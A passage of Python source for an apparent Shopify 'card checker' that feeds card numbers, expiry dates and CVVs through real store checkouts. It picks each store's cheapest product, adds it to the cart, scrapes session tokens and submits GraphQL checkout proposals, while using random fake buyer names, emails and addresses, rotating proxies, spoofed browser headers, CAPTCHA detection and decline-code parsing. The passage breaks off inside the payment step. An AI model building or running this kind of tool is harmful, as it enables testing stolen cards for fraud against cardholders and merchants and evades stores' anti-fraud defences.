__typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""


# =====================================================================
# LOGGING
# =====================================================================
LOG_DIR = os.getenv("LOG_DIR", "logs")
LOG_JSON = os.getenv("LOG_JSON", "false").lower() in ("1", "true", "yes")
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO").upper()
os.makedirs(LOG_DIR, exist_ok=True)


class _JsonFormatter(logging.Formatter):
    def format(self, record):
        payload = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(record.created)),
            "level": record.levelname,
            "logger": record.name,
            "msg": record.getMessage(),
        }
        if record.exc_info:
            payload["exc"] = self.formatException(record.exc_info)
        for k in ("request_id", "site"):
            if hasattr(record, k):
                payload[k] = getattr(record, k)
        return json.dumps(payload)


logger = logging.getLogger("shopify-checker")
logger.setLevel(LOG_LEVEL)
logger.handlers.clear()
_formatter = _JsonFormatter() if LOG_JSON else logging.Formatter(
    "%(asctime)s [%(levelname)s] %(message)s"
)
_fh = RotatingFileHandler(os.path.join(LOG_DIR, "checker.log"), maxBytes=10_000_000, backupCount=3)
_fh.setFormatter(_formatter)
_ch = logging.StreamHandler(sys.stdout)
_ch.setFormatter(_formatter)
logger.addHandler(_fh)
logger.addHandler(_ch)


# =====================================================================
# VARIANT CACHE
# =====================================================================
VARIANT_CACHE_FILE = os.getenv("VARIANT_CACHE_FILE", "variant_cache.json")
_CACHE_TTL = int(os.getenv("VARIANT_CACHE_TTL", "3600"))
_variant_cache = {}
_cache_lock = threading.Lock()


def load_variant_cache():
    global _variant_cache
    try:
        if os.path.exists(VARIANT_CACHE_FILE):
            with open(VARIANT_CACHE_FILE, "r") as f:
                _variant_cache = json.load(f)
            logger.info(f"loaded {len(_variant_cache)} entries from variant cache")
    except Exception as e:
        logger.warning(f"failed to load variant cache: {e}")
        _variant_cache = {}


def save_variant_cache():
    try:
        with _cache_lock:
            with open(VARIANT_CACHE_FILE, "w") as f:
                json.dump(_variant_cache, f, indent=2)
    except Exception as e:
        logger.warning(f"failed to save variant cache: {e}")


def get_cached_variant(domain):
    domain = domain.rstrip("/")
    with _cache_lock:
        entry = _variant_cache.get(domain)
        if entry and time.time() - entry.get("timestamp", 0) < _CACHE_TTL:
            return entry.get("variant_id"), entry.get("price"), entry.get("requires_shipping"), entry.get("handle")
    return None, None, None, None


def set_cached_variant(domain, variant_id, price, requires_shipping, handle=None):
    domain = domain.rstrip("/")
    with _cache_lock:
        _variant_cache[domain] = {
            "variant_id": variant_id,
            "price": price,
            "requires_shipping": requires_shipping,
            "handle": handle or "cached",
            "timestamp": time.time(),
        }
    save_variant_cache()


load_variant_cache()


# =====================================================================
# METRICS
# =====================================================================
_metrics_lock = threading.Lock()
_active_checkouts = 0


def _increment_active():
    global _active_checkouts
    with _metrics_lock:
        _active_checkouts += 1


def _decrement_active():
    global _active_checkouts
    with _metrics_lock:
        _active_checkouts -= 1


# =====================================================================
# ADDRESS BOOK + IDENTITY
# =====================================================================
C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU"}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, currency=None):
    currency = (currency or "").upper()
    if currency in C2C and C2C[currency] in book:
        return book[C2C[currency]]
    tld = urlparse(url).netloc.split(".")[-1].upper()
    if tld in book:
        return book[tld]
    return book["DEFAULT"]


FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]


def get_random_name():
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def generate_email(first, last):
    return f"{first.lower()}.{last.lower()}@{random.choice(EMAIL_DOMAINS)}"


# =====================================================================
# PROXY
# =====================================================================
_SCHEME_RE = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.\-]*)://(.*)$")


def _is_port(value):
    return value.isdigit() and 1 <= int(value) <= 65535


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    raw = proxy_str.strip()
    if not raw:
        return None

    scheme = "http"
    body = raw
    m = _SCHEME_RE.match(raw)
    if m:
        scheme = m.group(1).lower()
        body = m.group(2)

    user, password = None, None
    if "@" in body:
        auth, body = body.rsplit("@", 1)
        if ":" in auth:
            user, password = auth.split(":", 1)
        else:
            user = auth

    parts = body.split(":")
    if len(parts) == 2:
        host, port = parts
    elif len(parts) == 4:
        p0, p1, p2, p3 = parts
        if _is_port(p1):
            host, port, user, password = p0, p1, p2, p3
        elif _is_port(p3):
            user, password, host, port = p0, p1, p2, p3
        else:
            host, port, user, password = p0, p1, p2, p3
    elif len(parts) == 3:
        host, port, user = parts
        password = ""
    else:
        return None

    if not host or not _is_port(port):
        return None

    port_int = int(port)
    if user:
        url = f"{scheme}://{user}:{password or ''}@{host}:{port_int}"
    else:
        url = f"{scheme}://{host}:{port_int}"

    return {"url": url, "scheme": scheme, "host": host, "port": port_int, "user": user, "pass": password}


def proxy_is_socks(proxy):
    return bool(proxy) and proxy["scheme"] in ("socks4", "socks5", "socks5h")


def proxy_for_aiohttp(proxy):
    if not proxy:
        return None
    if proxy_is_socks(proxy):
        return None
    return proxy["url"]


def make_connector(proxy, **kwargs):
    if proxy and proxy_is_socks(proxy) and HAS_SOCKS:
        ptype = {
            "socks4": ProxyType.SOCKS4,
            "socks5": ProxyType.SOCKS5,
            "socks5h": ProxyType.SOCKS5,
        }[proxy["scheme"]]
        return ProxyConnector(
            proxy_type=ptype,
            host=proxy["host"],
            port=proxy["port"],
            username=proxy["user"],
            password=proxy["pass"] or "",
            **kwargs,
        )
    return aiohttp.TCPConnector(ssl=False, force_close=False, enable_cleanup_closed=True, **kwargs)


def mask_proxy_for_log(proxy_str):
    if not proxy_str:
        return None
    try:
        s = proxy_str
        if "://" in s:
            s = s.split("://", 1)[1]
        if "@" in s:
            s = s.split("@", 1)[1]
        return s.split(":", 1)[0]
    except Exception:
        return proxy_str[:30]


# =====================================================================
# HELPERS
# =====================================================================
def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0]
    except Exception:
        pass
    return None


def find_first(text, *patterns):
    if not text:
        return None
    for start, end in patterns:
        if not start or not end or start not in text:
            continue
        tail = text.split(start, 1)[1]
        if end in tail:
            result = tail.split(end, 1)[0]
            if result:
                return result
    return None


def is_captcha_required(text):
    if not text:
        return False
    indicators = ("CAPTCHA_REQUIRED", "hcaptcha", "cf-browser-verification", "just a moment")
    lower = text.lower()
    return any(i.lower() in lower for i in indicators)


def is_dead_store(html):
    if not html:
        return False
    lower = html.lower()
    return any(i in lower for i in (
        "this store is currently unavailable",
        "store is currently unavailable",
        "reactivate your store",
        "store is unavailable",
    ))


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    for pattern in (
        r"(PAYMENTS_[A-Z_]+)",
        r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+)",
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ):
        m = re.search(pattern, message, re.IGNORECASE)
        if m:
            token = m.group(1)
            if "_" in token:
                return token.strip("{}:'\" ")
    return message[:200]


def mask_card(card):
    s = re.sub(r"\D", "", card or "")
    if len(s) >= 10:
        return f"{s[:6]}******{s[-4:]}"
    return "***"


def get_operation_name(query_str):
    m = re.search(r"(?:query|mutation)\s+(\w+)", query_str)
    return m.group(1) if m else None


async def post_with_retry(session, url, data=None, json=None, headers=None,
                          proxy=None, max_retries=2, backoff=0.5):
    for attempt in range(max_retries):
        try:
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy) as resp:
                if resp.status == 429:
                    await asyncio.sleep(backoff * (2 ** attempt) + random.uniform(0, 1))
                    continue
                return resp
        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt == max_retries - 1:
                raise
            await asyncio.sleep(backoff * (2 ** attempt))
    return None


# =====================================================================
# PRODUCT FETCH
# =====================================================================
async def fetch_products(domain, proxy_str=None, force_refresh=False):
    domain = domain.rstrip("/")
    if not domain.startswith("http"):
        domain = "https://" + domain

    if not force_refresh:
        vid, price, ship, handle = get_cached_variant(domain)
        if vid is not None:
            logger.info(f"cache hit {domain} variant={vid} price={price}")
            return {
                "site": domain, "price": price, "variant_id": vid,
                "link": f"{domain}/products/{handle or 'cached'}",
                "requires_shipping": ship, "handle": handle or "cached",
            }, None

    proxy = parse_proxy(proxy_str) if proxy_str else None
    proxy_url = proxy_for_aiohttp(proxy)
    connector = make_connector(proxy)
    timeout = aiohttp.ClientTimeout(total=30)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": domain + "/",
    }

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        all_variants = []
        page = 1
        limit = 250
        max_products = 1000
        fetched = 0

        try:
            while fetched < max_products:
                url = f"{domain}/products.json?limit={limit}&page={page}"
                async with session.get(url, headers=headers, proxy=proxy_url, timeout=8) as resp:
                    if resp.status != 200:
                        break
                    data = await resp.json()
                    products = data.get("products", [])
                    if not products:
                        break
                    for p in products:
                        for v in p.get("variants", []):
                            if v.get("available", True):
                                try:
                                    price = float(v.get("price", "0").replace(",", ""))
                                    vid = str(v.get("id", ""))
                                    if vid and price > 0:
                                        all_variants.append({
                                            "id": vid, "price": price,
                                            "handle": p.get("handle", "product"),
                                            "title": p.get("title", ""),
                                            "requires_shipping": v.get("requires_shipping", True),
                                        })
                                except (ValueError, TypeError):
                                    continue
                    fetched += len(products)
                    if len(products) < limit:
                        break
                    page += 1
                    await asyncio.sleep(0.1)

            if all_variants:
                all_variants.sort(key=lambda x: x["price"])
                s = all_variants[0]
                logger.info(f"REST selected handle={s['handle']} id={s['id']} price={s['price']}")
                set_cached_variant(domain, s["id"], str(s["price"]), s["requires_shipping"], s["handle"])
                return {
                    "site": domain, "price": f"{s['price']:.2f}",
                    "variant_id": s["id"],
                    "link": f"{domain}/products/{s['handle']}",
                    "requires_shipping": s["requires_shipping"],
                    "handle": s["handle"],
                }, None
        except Exception as e:
            logger.debug(f"REST paginated fetch failed: {e}")

        try:
            query = """
            query Products($first:Int!) {
                products(first:$first) {
                    edges { node { id title handle variants(first:50) {
                        edges { node { id priceV2 { amount currencyCode } availableForSale requiresShipping } }
                    } } }
                }
            }
            """
            payload = {"query": query, "variables": {"first": 50}}
            async with session.post(
                f"{domain}/api/2024-01/graphql.json",
                json=payload,
                headers={"Content-Type": "application/json", **headers},
                proxy=proxy_url, timeout=8,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if "errors" not in data:
                        edges = data.get("data", {}).get("products", {}).get("edges", [])
                        if edges:
                            variants = []
                            for edge in edges:
                                node = edge.get("node", {})
                                for ve in node.get("variants", {}).get("edges", []):
                                    vn = ve.get("node", {})
                                    if vn.get("availableForSale", True):
                                        try:
                                            price = float(vn.get("priceV2", {}).get("amount", "0"))
                                            vid = str(vn.get("id", "").split("/")[-1])
                                            if vid and price > 0:
                                                variants.append({
                                                    "id": vid, "price": price,
                                                    "handle": node.get("handle", "product"),
                                                    "requires_shipping": vn.get("requiresShipping", True),
                                                })
                                        except (ValueError, TypeError):
                                            continue
                            if variants:
                                variants.sort(key=lambda x: x["price"])
                                s = variants[0]
                                logger.info(f"GraphQL selected handle={s['handle']} id={s['id']} price={s['price']}")
                                set_cached_variant(domain, s["id"], str(s["price"]), s["requires_shipping"], s["handle"])
                                return {
                                    "site": domain, "price": f"{s['price']:.2f}",
                                    "variant_id": s["id"],
                                    "link": f"{domain}/products/{s['handle']}",
                                    "requires_shipping": s["requires_shipping"],
                                    "handle": s["handle"],
                                }, None
        except Exception as e:
            logger.debug(f"GraphQL fetch failed: {e}")

    return False, "No products found"


# =====================================================================
# ADD TO CART
# =====================================================================
async def add_to_cart_async(session, domain, variant_id, proxy=None):
    domain = domain.rstrip("/")
    if not domain.startswith("http"):
        domain = "https://" + domain

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": domain,
        "Referer": domain + "/products",
    }

    url = f"{domain}/cart/add.js"

    headers = {**base_headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    try:
        resp = await post_with_retry(session, url, data=f"id={variant_id}&quantity=1",
                                     headers=headers, proxy=proxy, max_retries=1, backoff=0.5)
        if resp and resp.status in (200, 201):
            logger.info("cart add ok (form)")
            return resp
    except Exception as e:
        logger.warning(f"cart form exception: {e}")

    headers = {**base_headers, "Content-Type": "application/json"}
    try:
        resp = await post_with_retry(session, url,
                                     json={"items": [{"id": int(variant_id), "quantity": 1}]},
                                     headers=headers, proxy=proxy, max_retries=1, backoff=0.5)
        if resp and resp.status in (200, 201):
            logger.info("cart add ok (json)")
            return resp
    except Exception as e:
        logger.warning(f"cart json exception: {e}")

    logger.error("cart add failed on all methods")
    return None


# =====================================================================
# CORE: process_card
# =====================================================================
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    proxy_ok = True
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    attempted_price = "0.00"

    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    proxy_url = proxy_for_aiohttp(proxy)
    checkpoint_data = None
    requires_shipping = True

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]

        firstName, lastName = get_random_name()
        email = generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]

        # primary domain
        primary_domain = None
        try:
            async with aiohttp.ClientSession() as temp_session:
                async with temp_session.post(
                    f"{ourl}/api/2024-01/graphql.json",
                    json={"query": "{ shop { primaryDomain { url } } }"},
                    headers={"Content-Type": "application/json"},
                    timeout=5,
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        pd = data.get("data", {}).get("shop", {}).get("primaryDomain", {}).get("url")
                        if pd:
                            primary_domain = pd.rstrip("/")
        except Exception as e:
            logger.debug(f"primary domain fetch failed: {e}")

        if primary_domain:
            ourl = primary_domain

        if not variant_id:
            info = None
            err = None
            for fetch_attempt in range(FETCH_RETRIES):
                force = fetch_attempt > 0
                info, err = await fetch_products(ourl, proxy_str, force_refresh=force)
                if info is not False and info is not None:
                    break
                # try www variant
                if not ourl.startswith("https://www."):
                    www = ourl.replace("https://", "https://www.")
                    info, err = await fetch_products(www, proxy_str, force_refresh=True)
                    if info is not False and info is not None:
                        ourl = www
                        break
                if fetch_attempt < FETCH_RETRIES - 1:
                    logger.warning(
                        f"Product fetch attempt {fetch_attempt + 1}/{FETCH_RETRIES} "
                        f"failed ({err}), retrying..."
                    )
                    await asyncio.sleep(RETRY_BACKOFF * (2 ** fetch_attempt) + random.uniform(0, 0.5))
            if info is False or info is None:
                return False, err or "Product fetch failed", gateway, total_price, currency, proxy_ok
            variant_id = info["variant_id"]
            requires_shipping = info.get("requires_shipping", True)

        connector = make_connector(proxy)
        timeout = aiohttp.ClientTimeout(total=18)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cart_resp = None
            for cart_attempt in range(CART_RETRIES):
                cart_resp = await add_to_cart_async(session, ourl, variant_id, proxy_url)
                if cart_resp and cart_resp.status in (200, 201):
                    break
                if cart_attempt < CART_RETRIES - 1:
                    status = cart_resp.status if cart_resp else "NO_RESPONSE"
                    logger.warning(
                        f"Cart add attempt {cart_attempt + 1}/{CART_RETRIES} "
                        f"failed ({status}), retrying..."
                    )
                    await asyncio.sleep(RETRY_BACKOFF * (2 ** cart_attempt) + random.uniform(0, 0.5))
            if not cart_resp or cart_resp.status not in (200, 201):
                status = cart_resp.status if cart_resp else "NO_RESPONSE"
                return False, f"Cart failed with status {status}", gateway, total_price, currency, proxy_ok

            checkout_headers = {**headers, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
            try:
                response = await session.post(
                    url=ourl + "/checkout",
                    allow_redirects=True,
                    headers=checkout_headers,
                    proxy=proxy_url,
                    timeout=10,
                )
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                proxy_ok = False
                return False, f"Checkout proxy error: {str(e)}", gateway, total_price, currency, proxy_ok

            checkout_url = str(response.url)
            text = await response.text()

            if is_dead_store(text):
                return False, "DEAD_STORE", gateway, total_price, currency, proxy_ok

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency, proxy_ok

            attempt_token = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = attempt_token.group(1) if attempt_token else checkout_url.split("/")[-1].split("?")[0]

            sst = response.headers.get("X-Checkout-One-Session-Token")
            if not sst:
                parsed = urlparse(checkout_url)
                r_param = parse_qs(parsed.query).get("_r", [None])[0]
                if r_param and len(r_param) > 20:
                    sst = r_param
            if not sst:
                sst = find_first(
                    text,
                    ('name="serialized-sessionToken" content="&quot;', "&quot;"),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('<meta name="serialized-sessionToken" content="', '"'),
                    ('"sessionToken":"', '"'),
                )
            if not sst:
                tok = re.search(r"[a-f0-9]{32,}", checkout_url)
                if tok:
                    sst = tok.group(0)

            if not sst:
                logger.warning(f"no sst. url={checkout_url}")
                return False, "Failed to get session token", gateway, total_price, currency, proxy_ok

            queueToken = find_first(text, ("queueToken&quot;:&quot;", "&quot;"), ('"queueToken":"', '"'))
            stableId = find_first(text, ("stableId&quot;:&quot;", "&quot;"), ('"stableId":"', '"')) or "1"
            merch = find_first(
                text,
                ("ProductVariantMerchandise/", "&quot;"),
                ('"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"'),
            ) or str(variant_id)

            currency = "USD"
            if "currencyCode&quot;:&quot;" in text:
                currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            address_info = pick_addr(ourl, currency)
            country_code = address_info["countryCode"]
            phone = address_info["phone"]
            street = address_info["address1"]
            city = address_info["city"]
            state = address_info["zoneCode"]
            s_zip = address_info["postalCode"]

            subtotal = extract_between(
                text,
                'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                "&quot;",
            ) or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                m = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = m.group(1) if m else "0.01"
            attempted_price = subtotal

            unescaped = text.replace("&quot;", '"')
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            build_id = bm.group(1) if bm else None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            ident_sig = im.group(1) if im else None

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            use_persisted = "internal/graphql/persisted" in text or "persisted?operationName" in text
            persisted_id = None
            if use_persisted:
                persisted_id = extract_between(text, '"persistedQueryId":"', '"') or \
                    "ab9f6891d952494319a7dc077b627ed5e468a855944d95806ee91c1e64a1edad"

            if use_persisted:
                graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/internal/graphql/persisted"
                logger.info("persisted endpoint")
            else:
                graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
                logger.info("unstable endpoint")

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
                headers["x-checkout-web-server-handling"] = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            async def make_graphql_request(payload):
                nonlocal proxy_ok
                try:
                    op_name = payload.get("operationName")
                    params = {"operationName": op_name} if op_name else {}
                    if use_persisted and persisted_id:
                        payload = payload.copy()
                        payload["id"] = persisted_id
                        payload.pop("query", None)
                    async with session.post(
                        graphql_url, params=params, headers=headers,
                        json=payload, proxy=proxy_url, timeout=10,
                    ) as resp:
                        return await resp.text(), resp
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    proxy_ok = False
                    raise

            # shipping proposal input
            if requires_shipping:
                shipping_delivery = {
                    "deliveryLines": [{
                        "destination": {"partialStreetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone,
                        }},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True},
                            },
                            "options": {},
                        },
                        "targetMerchandiseLines": {"any": True},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": True,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }
            else:
                shipping_delivery = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stableId}],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }

            proposal_op = get_operation_name(QUERY_PROPOSAL_SHIPPING) or "Proposal"
            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": shipping_delivery,
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stableId,
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }]},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": "ENG", "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": proposal_op,
            }

            proposal_text = None
            for attempt in range(2):
                try:
                    proposal_text, _ = await make_graphql_request(json_data)
                    break
                except Exception as e:
                    if attempt == 0:
                        continue
                    proxy_ok = False
                    return False, f"Shipping proposal error: {str(e)}", gateway, total_price, currency, proxy_ok

            if not proposal_text:
                return False, "Shipping proposal failed", gateway, total_price, currency, proxy_ok
            if is_captcha_required(proposal_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, proxy_ok

            try:
                proposal_json = json.loads(proposal_text)
            except Exception:
                return False, "Invalid JSON in proposal", gateway, total_price, currency, proxy_ok

            if "errors" in proposal_json:
                return False, f"GraphQL Error: {proposal_json['errors']}", gateway, total_price, currency, proxy_ok

            session_data = proposal_json.get("data", {}).get("session", {})
            if not session_data:
                return False, "No session data", gateway, total_price, currency, proxy_ok
            result = session_data.get("negotiate", {}).get("result", {})
            if not result or result.get("__typename") != "NegotiationResultAvailable":
                return False, "No valid result", gateway, total_price, currency, proxy_ok

            checkpoint_data = result.get("checkpointData")
            seller_proposal = result.get("sellerProposal", {})
            if not seller_proposal:
                return False, "No seller proposal", gateway, total_price, currency, proxy_ok

            if requires_shipping:
                delivery_data = seller_proposal.get("delivery", {})
                if delivery_data.get("__typename") == "FilledDeliveryTerms":
                    dlines = delivery_data.get("deliveryLines", [{}])
                    strategies = dlines[0].get("availableDeliveryStrategies", []) if dlines else []
                    if strategies:
                        cheapest = min(strategies, key=lambda s: float(s.get("amount", {}).get("value", {}).get("amount", 999999)))
                        delivery_strategy = cheapest.get("handle", "")
                        shipping_amount = float(cheapest.get("amount", {}).get("value", {}).get("amount", "0"))
                    else:
                        delivery_strategy = ""
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ""
                    shipping_amount = 0.0
            else:
                delivery_strategy = ""
                shipping_amount = 0.0

            if requires_shipping and shipping_amount == 0.0:
                shipping_amount = 0.01
                logger.warning("shipping was 0, set 0.01")

            tax_data = seller_proposal.get("tax", {})
            tax_amount = 0.0
            if tax_data and tax_data.get("totalTaxAmount"):
                tax_amount = float(tax_data["totalTaxAmount"].get("value", {}).get("amount", "0"))

            payment_data = seller_proposal.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
